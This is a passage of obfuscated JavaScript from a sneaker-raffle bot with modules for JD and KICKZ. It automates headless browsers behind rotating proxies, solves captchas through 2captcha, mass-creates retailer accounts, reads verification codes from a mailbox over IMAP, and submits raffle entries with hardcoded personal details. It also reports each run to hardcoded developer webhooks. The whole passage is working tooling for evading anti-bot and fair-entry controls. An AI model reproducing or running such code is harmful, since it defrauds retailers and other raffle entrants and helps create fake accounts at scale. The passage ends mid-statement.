                    return console['log'](_0x1403a4['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x51d52a['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x11f475 = 0x0; _0x11f475 < _0x3a220d['length']; _0x11f475++) {
                    if (_0x295c4a != 'yes')
                        var _0x295c4a = '', _0x2ba5d9 = 0x0;
                    var _0x165e56, _0x2c383e = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x3a220d[_0x11f475]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x3a220d[_0x11f475]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x358285
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x51d52a['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x3b2d4c
                            }
                        ]
                    }];
                    const _0x1257a0 = { 'embeds': _0x2c383e };
                    _0x244762(_0xf2c6b['name'] + '\x20Task\x20' + (_0x11f475 + 0x1) + '\x20/\x20' + _0x3a220d['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                    try {
                        await _0x2c2316(_0x3a220d, _0x11f475);
                    } catch {
                        _0x295c4a = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x57328 = await _0x2520f4(_0x3a220d[_0x11f475], _0xf2c6b, 'dev', ![]), _0x22b94a = await _0x2520f4(_0x3a220d[_0x11f475], _0xf2c6b, 'pub', ![]);
                    const _0x5705aa = {
                        'succesDEVMSG': { 'embeds': [_0x57328] },
                        'succesPUBMSG': { 'embeds': [_0x22b94a] }
                    };
                    if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
                        try {
                            await _0x3c7bbe(_0x51d52a['webhook'], _0x5705aa['succesDEVMSG']);
                        } catch {
                        }
                    await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x5705aa['succesDEVMSG']), await _0x116d4a(0xc8);
                    try {
                        await _0x3c7bbe(_0x55a106, _0x5705aa['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x3a220d[_0x11f475]['Email'] == '' || _0x3a220d[_0x11f475]['Url'] == '' || _0x3a220d[_0x11f475]['FirstName'] == '' || _0x3a220d[_0x11f475]['LastName'] == '') {
                        console['log'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x51d52a['useRandomProxy'] = ![])
                        var _0x5c7f3a = _0x5276e5[_0x11f475]['split'](':');
                    else
                        var _0x4eef74 = Math['round'](Math['random']() * (_0x5276e5['length'] - 0x1)), _0x5c7f3a = _0x5276e5[_0x4eef74]['split'](':');
                    var _0x236a8e;
                    try {
                        _0x236a8e = await _0x5d136d['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5c7f3a[0x0] + ':' + _0x5c7f3a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x236a8e = await _0x5d136d['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5c7f3a[0x0] + ':' + _0x5c7f3a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x26bd18 = await _0x236a8e['newPage']();
                        await _0x26bd18['authenticate']({
                            'username': '' + _0x5c7f3a[0x2],
                            'password': '' + _0x5c7f3a[0x3]
                        }), console['log'](_0x3982db() + '\x20[' + _0xf2c6b['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x26bd18['setRequestInterception'](!![]), _0x26bd18['on']('request', _0x38c032 => {
                            _0x38c032['resourceType']() === 'image' || _0x38c032['resourceType']() === 'font' || _0x38c032['resourceType']() === 'media' ? _0x38c032['abort']() : _0x38c032['continue']();
                        });
                        try {
                            await _0x26bd18['goto']('' + _0x3a220d[_0x11f475]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x26bd18['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x3982db() + '\x20[' + _0xf2c6b['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x26bd18['type']('#comp_firstname', '' + _0x3a220d[_0x11f475]['FirstName']), await _0x26bd18['waitForSelector']('#comp_lastname'), await _0x26bd18['type']('#comp_lastname', '' + _0x3a220d[_0x11f475]['LastName']), await _0x26bd18['waitForSelector']('#comp_email'), await _0x26bd18['type']('#comp_email', '' + _0x3a220d[_0x11f475]['Email']), await _0x26bd18['waitForSelector']('#comp_paypalemail'), await _0x26bd18['type']('#comp_paypalemail', '' + _0x3a220d[_0x11f475]['Email']), await _0x26bd18['waitForSelector']('#comp_mobile_end'), await _0x26bd18['type']('#comp_mobile_end', '' + _0x3a220d[_0x11f475]['Phone']), await _0x26bd18['waitForSelector']('#comp_dob'), await _0x26bd18['type']('#comp_dob', '08/09/1992'), console['log'](_0x3982db() + '\x20[' + _0xf2c6b['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x3a220d[_0x11f475]['Size'] == 'RANDOM') {
                            const _0x1d9d61 = await _0x26bd18['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3b6a01 => {
                                return _0x3b6a01['map'](_0x245b54 => _0x245b54['value']);
                            });
                            var _0x549e5c = Math['round'](Math['random']() * (_0x1d9d61['length'] - 0x2));
                            await _0x26bd18['select']('#shoesize', _0x1d9d61[_0x549e5c + 0x1]), await _0x116d4a(0x3e8);
                        } else {
                            const _0xd81fcc = await _0x26bd18['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x125fe5 => {
                                return _0x125fe5['map'](_0xbf9cee => _0xbf9cee['innerText']);
                            }), _0x3e2628 = await _0x26bd18['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x27519e => {
                                return _0x27519e['map'](_0xc17d34 => _0xc17d34['value']);
                            });
                            var _0x206d36 = _0x3a220d[_0x11f475]['Size'];
                            for (var _0x5d1ba9 = 0x1; _0x5d1ba9 < _0x3e2628['length']; _0x5d1ba9++) {
                                var _0x50e6e0 = _0xd81fcc[_0x5d1ba9]['split']('\x20')[0x0];
                                if (_0x50e6e0 == _0x206d36) {
                                    await _0x26bd18['select']('#shoesize', _0x3e2628[_0x5d1ba9]);
                                    break;
                                } else {
                                    if (_0x5d1ba9 + 0x1 == _0x3e2628['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x26bd18['waitForSelector']('#comp_address1'), await _0x26bd18['type']('#comp_address1', _0x3a220d[_0x11f475]['Address1'] + '\x20' + _0x3a220d[_0x11f475]['HouseNumber']), await _0x26bd18['waitForSelector']('#comp_address2'), await _0x26bd18['type']('#comp_address2', '' + _0x3a220d[_0x11f475]['Address2']), await _0x26bd18['waitForSelector']('#comp_address2'), await _0x26bd18['type']('#comp_address3', '' + _0x3a220d[_0x11f475]['City']), await _0x26bd18['waitForSelector']('#comp_postcode'), await _0x26bd18['type']('#comp_postcode', '' + _0x3a220d[_0x11f475]['Zip']), console['log'](_0x3982db() + '\x20[' + _0xf2c6b['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x116d4a(0x4b0), await _0x26bd18['click']('label#emailhold'), await _0x116d4a(0x5dc), await _0x26bd18['click']('#preauth_tandc_email\x20>\x20label'), await _0x116d4a(0x5dc), await _0x26bd18['click']('#submit');
                        try {
                            await _0x26bd18['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x3982db() + '\x20[' + _0xf2c6b['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20' + _0x1403a4['blue']('Awaiting\x20Paypal\x20Payment')), _0x236a8e['on']('targetcreated', async _0x59b477 => {
                            if (_0x59b477['type']() === 'page') {
                                const _0xe3cdd5 = await _0x59b477['page']();
                                async function _0x3ee1b6() {
                                    try {
                                        await _0x26bd18['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x3bb2e2 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x595f0a() {
                                    try {
                                        await _0x26bd18['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x128e3f = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x595f0a(), _0x3ee1b6(), await _0x116d4a(0x493e0);
                            }
                        });
                        async function _0x5c6bf8() {
                            for (let _0x119757 = 0x0; _0x119757 < 0x12c; _0x119757++) {
                                if (_0x128e3f == !![]) {
                                    _0x295c4a = 'no', _0x523ce4(_0x3a220d[_0x11f475], _0xf2c6b), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0xf2c6b['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
                                        try {
                                            await _0x3c7bbe(_0x51d52a['webhook'], _0x5705aa['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x5705aa['succesDEVMSG']), await _0x116d4a(0xc8);
                                    try {
                                        await _0x3c7bbe(_0x55a106, _0x5705aa['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x3bb2e2)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x116d4a(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x116d4a(0xbb8), await _0x26bd18['click']('.zoid-outlet'), await _0x116d4a(0x7d0), await _0x5c6bf8();
                    } catch (_0x281b9c) {
                        console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0xf2c6b['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20' + _0x281b9c)), _0x165e56 = '' + _0x281b9c;
                        var _0x30d336 = await _0x2520f4(_0x3a220d[_0x11f475], _0xf2c6b, 'dev', !![], _0x165e56);
                        _0x5705aa['errorDEV'] = { 'embeds': [_0x30d336] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x5705aa['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x5705aa['errorDEV']);
                    } finally {
                        _0x236a8e && _0x236a8e['close']();
                        if (_0x295c4a == 'yes' && _0x2ba5d9 != 0x5 && _0x165e56 != 'Size\x20Not\x20Found') {
                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0xf2c6b['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2ba5d9 + '\x20/\x205)')), _0x11f475 = _0x11f475 - 0x1, _0x2ba5d9 = _0x2ba5d9 + 0x1;
                            continue;
                        }
                        _0x295c4a == 'yes' && _0x2ba5d9 >= 0x5 && (_0x5925c7(afew[_0x11f475], _0xf2c6b), _0x295c4a = 'no', _0x2ba5d9 = 0x0), console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x541428, _0x25ee82, _0x5db278) {
                    _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51d52a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1c5064 = 0x0; _0x1c5064 < _0x25ee82['length']; _0x1c5064++) {
                        const _0x11953c = 'https://www.kickz.com/login';
                        if (_0x54fb5f != 'yes')
                            var _0x54fb5f = '', _0x250ba9 = 0x0;
                        _0x244762(_0x541428['name'] + '\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20/\x20' + _0x25ee82['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                        try {
                            await _0x2c2316(_0x25ee82, _0x1c5064);
                        } catch {
                            _0x54fb5f = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x2ae6bd = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x358285
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x51d52a['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3b2d4c
                                }
                            ]
                        }];
                        const _0xd3594 = { 'embeds': _0x2ae6bd };
                        var _0x15c12c = await _0x2520f4(_0x25ee82[_0x1c5064], _0x541428, 'acc', ![]);
                        const _0x1b71f7 = { 'succesDEVMSG': { 'embeds': [_0x15c12c] } };
                        if (_0x25ee82[_0x1c5064]['Email'] == '' || _0x25ee82[_0x1c5064]['FirstName'] == '' || _0x25ee82[_0x1c5064]['LastName'] == '') {
                            console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x25ee82[_0x1c5064]['Password'] == '' && (_0x25ee82[_0x1c5064]['Password'] = 'JRaffles23!');
                        if (_0x51d52a['useRandomProxy'] = ![])
                            var _0x2cf340 = _0x5db278[_0x1c5064]['split'](':');
                        else
                            var _0x1a29c3 = Math['round'](Math['random']() * (_0x5db278['length'] - 0x1)), _0x2cf340 = _0x5db278[_0x1a29c3]['split'](':');
                        var _0x11e51e;
                        try {
                            _0x11e51e = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2cf340[0x0] + ':' + _0x2cf340[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x11e51e = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2cf340[0x0] + ':' + _0x2cf340[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5d1f40 = await _0x11e51e['newPage']();
                            await _0x5d1f40['authenticate']({
                                'username': '' + _0x2cf340[0x2],
                                'password': '' + _0x2cf340[0x3]
                            }), console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5d1f40['setRequestInterception'](!![]), _0x5d1f40['on']('request', _0x4e3d43 => {
                                _0x4e3d43['resourceType']() === 'image' || _0x4e3d43['resourceType']() === 'font' || _0x4e3d43['resourceType']() === 'media' ? _0x4e3d43['abort']() : _0x4e3d43['continue']();
                            }), await _0x5d1f40['goto'](_0x11953c), await _0x116d4a(0xbb8), console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x5d1f40['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5d1f40['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5d1f40['waitForSelector']('#button-register'), await _0x116d4a(0x7d0), await _0x5d1f40['evaluate'](() => {
                                const _0x30bc7b = document['querySelector']('#button-register');
                                _0x30bc7b['click']();
                            }), console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x116d4a(0x1388), await _0x5d1f40['waitForSelector']('#customer_salutation'), await _0x5d1f40['select']('#customer_salutation', 'mr'), await _0x116d4a(0x7d0), await _0x5d1f40['waitForSelector']('#customer_firstname'), await _0x5d1f40['type']('#customer_firstname', '' + _0x25ee82[_0x1c5064]['FirstName']), await _0x116d4a(0x352), await _0x5d1f40['waitForSelector']('#customer_lastname'), await _0x5d1f40['type']('#customer_lastname', '' + _0x25ee82[_0x1c5064]['LastName']), await _0x116d4a(0x352), await _0x5d1f40['type']('#email-input', '' + _0x25ee82[_0x1c5064]['Email']), await _0x116d4a(0x352), await _0x5d1f40['type']('#email-confirm-input', '' + _0x25ee82[_0x1c5064]['Email']), await _0x116d4a(0x352), await _0x5d1f40['type']('#register-password', '' + _0x25ee82[_0x1c5064]['Password']), await _0x116d4a(0x352), await _0x5d1f40['type']('#password-confirm', '' + _0x25ee82[_0x1c5064]['Password']), await _0x116d4a(0x352), console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x5d1f40['click']('#consent'), await _0x116d4a(0x1f4);
                            const _0x31e6e4 = await _0x5d1f40['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x31e6e4) {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x5d1f40['click']('#buttonRegister');
                            try {
                                await _0x5d1f40['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x25ee82[_0x1c5064]['Email']), await _0x116d4a(0x4b0);
                            async function _0x1eaa52() {
                                var _0x342f7b, _0x1b871e = ![];
                                for (var _0x5ecdf7 = 0x0; _0x5ecdf7 < 0x18; _0x5ecdf7++) {
                                    async function _0x3d7a3d() {
                                        var _0x2f9091 = new _0x3e4e8d({
                                            'user': _0x51d52a['masterMail'],
                                            'password': _0x51d52a['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x1f4674(_0x47a25e) {
                                            _0x2f9091['openBox']('INBOX', ![], _0x47a25e);
                                        }
                                        _0x2f9091['once']('ready', function () {
                                            console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x1f4674(function (_0x139125, _0x2240f1) {
                                                console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x139125)
                                                    throw _0x139125;
                                                _0x2f9091['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x12b506, _0x499a73) {
                                                    if (!_0x499a73 || !_0x499a73['length'])
                                                        console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x2f9091['end']();
                                                    else {
                                                        var _0xc4670b = _0x2f9091['seq']['fetch'](_0x499a73, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0xc4670b['on']('message', function (_0x4b7dea, _0x400946) {
                                                            var _0x11f135 = '(#' + _0x400946 + ')\x20';
                                                            _0x4b7dea['on']('body', function (_0xaaab1d, _0x5735a9) {
                                                                _0x300bc8(_0xaaab1d, (_0x2a60fa, _0x5de516) => {
                                                                    if (_0x5de516['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x285b5e = _0x5de516['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x266c84 = _0x285b5e[0x1]['split']('<')[0x0];
                                                                        _0x342f7b = _0x266c84;
                                                                    }
                                                                });
                                                            }), _0x4b7dea['once']('end', function () {
                                                            });
                                                        }), _0xc4670b['once']('error', function (_0x3445bd) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0xc4670b['once']('end', function () {
                                                            _0x2f9091['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x2f9091['once']('error', function (_0x3c05ea) {
                                            console['log'](_0x1403a4['red'](_0x3c05ea['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x1b871e = !![];
                                        }), _0x2f9091['once']('end', async function () {
                                        }), _0x2f9091['connect']();
                                    }
                                    _0x3d7a3d(), await _0x116d4a(0x1388);
                                    if (_0x342f7b)
                                        return _0x342f7b;
                                    if (_0x1b871e)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x5ecdf7 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x1eaa52(), _0x116d4a(0x320), console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Verifying..'), await _0x5d1f40['type']('#verificationCode', code), await _0x116d4a(0x1f4), await _0x5d1f40['click']('#buttonVerify'), await _0x116d4a(0x190), await _0x5d1f40['click']('#buttonVerify'), await _0x116d4a(0x3e8);
                            try {
                                await _0x5d1f40['waitForSelector']('div.b-user_greeting'), _0x54fb5f = 'no', console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Account\x20' + _0x25ee82[_0x1c5064]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x65e0bc['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x25ee82[_0x1c5064]['Email'] + ',' + _0x25ee82[_0x1c5064]['Password'] + ','), console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Account\x20' + _0x25ee82[_0x1c5064]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1b71f7['succesDEVMSG']);
                                } catch {
                                }
                                await _0x3c7bbe(_0x431ce7, _0x1b71f7['succesDEVMSG']);
                            } catch {
                                _0x54fb5f = 'no', console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x591918) {
                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20' + _0x591918)), _0x2ae6bd[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x2ae6bd[0x0]['description'] = '' + _0x591918, await _0x3c7bbe(_0x802c1e, _0xd3594), _0x54fb5f = 'yes';
                        } finally {
                            _0x11e51e && _0x11e51e['close']();
                            if (_0x54fb5f == 'yes' && _0x250ba9 != 0x5) {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Retrying\x20(' + _0x250ba9 + '\x20/\x205)')), _0x1c5064 = _0x1c5064 - 0x1, _0x250ba9 = _0x250ba9 + 0x1;
                                continue;
                            }
                            _0x54fb5f == 'yes' && _0x250ba9 >= 0x5 && (_0x5925c7(_0x25ee82[_0x1c5064], _0x541428), _0x54fb5f = 'no', _0x250ba9 = 0x0), console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x59e332, _0x453f92, _0x164140) {
                    _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51d52a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x57a3d5 = 0x0; _0x57a3d5 < _0x453f92['length']; _0x57a3d5++) {
                        var _0xe494ce;
                        if (_0x508e22 != 'yes')
                            var _0x508e22 = '', _0xa4a705 = 0x0;
                        _0x244762(_0x59e332['name'] + '\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20/\x20' + _0x453f92['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                        var _0x19e60b = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x358285
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x453f92[_0x57a3d5]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x453f92[_0x57a3d5]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x51d52a['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3b2d4c
                                }
                            ]
                        }], _0x5f4243 = await _0x2520f4(_0x453f92[_0x57a3d5], _0x59e332, 'dev', ![]), _0x1daef8 = await _0x2520f4(_0x453f92[_0x57a3d5], _0x59e332, 'pub', ![]);
                        const _0x1da432 = {
                            'succesDEVMSG': { 'embeds': [_0x5f4243] },
                            'succesPUBMSG': { 'embeds': [_0x1daef8] }
                        };
                        try {
                            await _0x2c2316(_0x453f92, _0x57a3d5);
                        } catch {
                            _0x508e22 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x453f92[_0x57a3d5]['Email'] == '' || _0x453f92[_0x57a3d5]['Password'] == '' || _0x453f92[_0x57a3d5]['FirstName'] == '' || _0x453f92[_0x57a3d5]['LastName'] == '') {
                            console['log'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x51d52a['useRandomProxy'] = ![])
                            var _0x5135c5 = _0x164140[_0x57a3d5]['split'](':');
                        else
                            var _0x5305d1 = Math['round'](Math['random']() * (_0x164140['length'] - 0x1)), _0x5135c5 = _0x164140[_0x5305d1]['split'](':');
                        var _0x1d37e5;
                        try {
                            _0x1d37e5 = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x5135c5[0x0] + ':' + _0x5135c5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1d37e5 = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x5135c5[0x0] + ':' + _0x5135c5[0x1],
                                    '--no-sandbox',
